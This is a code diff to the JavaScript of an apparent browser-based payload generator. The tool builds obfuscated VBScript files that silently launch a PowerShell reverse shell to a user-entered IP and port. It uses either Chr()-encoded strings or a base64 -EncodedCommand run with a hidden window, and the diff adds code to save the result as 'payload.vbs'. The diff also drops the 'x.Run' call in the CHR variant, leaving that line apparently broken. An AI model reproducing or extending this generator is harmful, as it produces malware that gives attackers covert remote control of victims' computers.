@@ -5,8 +5,22 @@ document.addEventListener('DOMContentLoaded', function() {
     const modalClose = document.querySelector('.modal-close');
     const modalOk = document.getElementById('modal-ok');
     
-    let currentVbsContent = '';
+    const vbsFileInput = document.getElementById('vbs-file-input');
+    const vbsBrowseBtn = document.getElementById('vbs-browse');
+    const vbsFileName = document.getElementById('vbs-file-name');
     
+    vbsBrowseBtn.addEventListener('click', () => {
+        vbsFileInput.click();
+    });
+    
+    vbsFileInput.addEventListener('change', () => {
+        if (vbsFileInput.files.length > 0) {
+            vbsFileName.textContent = vbsFileInput.files[0].name;
+        } else {
+            vbsFileName.textContent = 'No location selected';
+        }
+    });
+
     function showModal(title, message, isError = false) {
         modalTitle.textContent = title;
         modalMessage.textContent = message;
@@ -79,6 +93,7 @@ document.addEventListener('DOMContentLoaded', function() {
     document.getElementById('generate-chr').addEventListener('click', () => {
         const ip = document.getElementById('ip').value;
         const port = parseInt(document.getElementById('port').value);
+        const filename = document.getElementById('filename').value || 'payload.vbs';
         
         if (!ip) {
             showModal('Error', 'Please enter target IP/Domain', true);
@@ -95,17 +110,23 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
+        if (!vbsFileInput.files.length) {
+            showModal('Error', 'Please select save location first', true);
+            return;
+        }
+        
         try {
             const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
             const payload = powershellReverseShell(ip, port);
             const obfPayload = obfuscateChr(payload);
-            currentVbsContent = (
+            const vbsContent = (
                 'Set x = CreateObject("WScript.Shell")\n' +
-                `x.Run ${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
+                `${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
             );
             
-            document.getElementById('vbs-output').value = currentVbsContent;
-            showModal('Success', 'CHR method VBS payload generated!');
+            document.getElementById('vbs-output').value = vbsContent;
+            downloadFile(vbsContent, filename);
+            showModal('Success', 'CHR method VBS generated and saved!');
         } catch (e) {
             showModal('Error', `Generation failed: ${e.message}`, true);
         }
@@ -114,6 +135,7 @@ document.addEventListener('DOMContentLoaded', function() {
     document.getElementById('generate-b64').addEventListener('click', () => {
         const ip = document.getElementById('ip').value;
         const port = parseInt(document.getElementById('port').value);
+        const filename = document.getElementById('filename').value || 'payload.vbs';
         
         if (!ip) {
             showModal('Error', 'Please enter target IP/Domain', true);
@@ -130,10 +152,25 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
+        if (!vbsFileInput.files.length) {
+            showModal('Error', 'Please select save location first', true);
+            return;
+        }
+        
         try {
             const payload = powershellReverseShell(ip, port);
             const encoder = new TextEncoder();
             const encoded = btoa(String.fromCharCode(...encoder.encode(payload)));
-            currentVbsContent = (
+            const vbsContent = (
                 'Set shell = CreateObject("Wscript.Shell")\n' +
-                `shell.Run "powers
+                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
+            );
+            
+            document.getElementById('vbs-output').value = vbsContent;
+            downloadFile(vbsContent, filename);
+            showModal('Success', 'Base64 method VBS generated and saved!');
+        } catch (e) {
+            showModal('Error', `Generation failed: ${e.message}`, true);
+        }
+    });
+});
